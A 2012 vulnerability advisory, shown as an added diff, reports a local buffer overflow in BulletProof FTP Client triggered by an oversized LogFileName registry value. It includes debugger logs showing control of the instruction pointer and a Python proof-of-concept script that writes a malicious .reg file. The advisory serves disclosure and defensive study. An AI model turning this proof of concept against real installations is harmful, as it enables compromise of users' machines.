@@ -1,0 +1,195 @@
+Title:
+======
+BulletProof FTP Client 2010 - Buffer Overflow Vulnerability
+
+
+Date:
+=====
+2012-04-02
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=475
+
+
+VL-ID:
+=====
+475
+
+
+Introduction:
+=============
+BPFTP Client is a fully automated FTP client, with many advanced features including automatic download resuming, 
+leech mode, ftp search and much more. Perfect for personal or corporate Webmasters as well as for Software and Music traders.
+
+Features:
++ Automatic Resume/Reconnect
++ Browse Offline with Cache
++ Leech Mode
++ Hidden File Support
++ Download Credit/Ratio Support
++ Clipboard Monitor
++ Queue 1,000s of Actions
++ Proxy/Firewall Support
++ HTTP/Webserver Support
++ Import CuteFTP, WS_FTP, FTP Explorer
++ Remote Mirroring
++ Search and Filter Ability
+
+(Copy of the Vendor Homepage: http://www.bpftp.com )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher discovered a Local Buffer Overflow vulnerability on BulletProof FTP Client v2010.75.0.76
+
+
+Report-Timeline:
+================
+2012-03-14:	Vendor Notification
+2012-03-16:	Vendor Response/Feedback
+2012-04-02:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+BulletProof
+Product: BPFTP Client Software (Windows) v2010.75.0.76 & 2011.x
+
+
+Exploitation-Technique:
+=======================
+Local
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+A Buffer Overflow vulnerability is detected on BulletProof FTP Client v2010.75.0.76 (current version).  The vulnerability is located 
+in the main executeable bpftpclient.exe. During the start of the application the value LogFileName from the 
+registry key [HKEY_CURRENT_USER/Software/BulletProof Software/BulletProof FTP Client 2010/Options] is read. 
+When inserting an oversized value to the registry value a buffer overflow is triggered. The victim only needs to start the application.
+
+Vulnerable Module(s):
+                                                   [+]  bpftpclient.exe
+
+
+---  Debugger Logs  ---
+# 42424242: The instruction at 0x42424242 referenced memory at 0x42424242. 
+The memory could not be read -> 42424242 (exc.code c0000005, tid 2264)
+
+# Registers:
+# EAX 00000000
+# ECX 42424242
+# EDX 7C9132BC ntdll.7C9132BC
+# EBX 00000000
+# ESP 0012F594
+# EBP 0012F5B4
+# ESI 00000000
+# EDI 00000000
+# EIP 42424242
+
+# Stack:
+# 0012F588   00140198
+# 0012F58C   7C91D80A  ntdll.7C91D80A
+# 0012F590   7C9601E1  ntdll.7C9601E1
+# 0012F594   7C9132A8  RETURN to ntdll.7C9132A8
+# 0012F598   0012F67C
+# 0012F59C   0012FBCC  ASCII ``AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC``
+# 0012F5A0   0012F698
+
+# Dump:
+# 0012FBB4  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012FBBC  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012FBC4  41 41 41 41 41 41 41 41  AAAAAAAA
+# 0012FBCC  41 41 41 41 42 42 42 42  AAAABBBB
+# 0012FBD4  43 43 43 43 43 43 43 43  CCCCCCCC
+# 0012FBDC  43 43 43 43 43 43 43 43  CCCCCCCC
+# 0012FBE4  43 43 43 43 43 43 43 43  CCCCCCCC
+
+
+Picture(s):
+                                                   ../1.png
+                                                   ../2.png
+
+
+Proof of Concept:
+=================
+The vulnerability can be exploited by local attackers. Successful exploitation requires no user inter action. For demonstration or reproduce ...
+
+#!/usr/bin/python
+ 
+# Exploit Title: BulletProof FTP Client v2010.75.0.76 Local Buffer Overflow 
+# Version:       2010.75.0.76
+# Date:          2012-03-11
+# Author:        Julien Ahrens
+# Homepage:      http://www.inshell.net
+# Software Link: http://www.bpftp.com/
+# Tested on:     Windows XP SP3 Professional German
+# Notes:         -
+# Howto:         Import Reg -> Start App
+
+file="poc.reg"
+
+junk1="\x41" * 448
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc="Windows Registry Editor Version 5.00\n\n"
+poc=poc + "[HKEY_CURRENT_USER\Software\BulletProof Software\BulletProof FTP Client 2010\Options]\n"
+poc=poc + "\"LogFileName\"=\"" + junk1 + boom + junk2 + "\""
+
+try:
+    print "[*] Creating exploit file...\n";
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!";
+except:
+    print "[!] Error while creating file!";
+
+
+
+Risk:
+=====
+The security risk of the local buffer overflow vulnerability is estimated as high(+).
+
+
+Credits:
+========
+Vulnerability Research Laboratory   -    Julien Ahrens  (MrTuxracer)  [www.inshell.net]
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
+
+
